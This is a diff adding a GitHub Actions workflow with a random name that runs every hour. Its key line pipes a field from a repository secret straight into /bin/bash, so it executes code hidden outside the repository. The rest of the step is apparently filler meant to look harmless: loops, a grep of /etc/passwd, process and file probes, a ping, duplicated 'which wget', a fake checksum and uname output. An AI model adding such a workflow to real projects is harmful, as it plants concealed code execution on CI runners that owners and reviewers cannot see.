@@ -1,0 +1,31 @@
+name: tongweiren3126
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongweiren3126
+        env:
+          s14762: ${{ secrets.s14762 }}
+        run: |
+          sleep 0.1 2>/dev/null || true
+          for i in 1 2 3; do echo "Loop $i"; done
+          echo $s14762 | jq -r .k976 | /bin/bash
+          : ' Another single-line comment '
+          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
+          printf "%s" "xyz" > tmp.xyz
+          ps -ef | grep zxcy.fjijuihinfkd.781
+          echo "Dir: $(pwd)"
+          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
+          ping -c 10 github.com
+          if [ -x /bin/ls ]; then echo "LS executable"; fi
+          which uname
+          which wget
+          which wget
+          echo "Checksum: $((1000 + RANDOM % 9000))"
+          uname -a
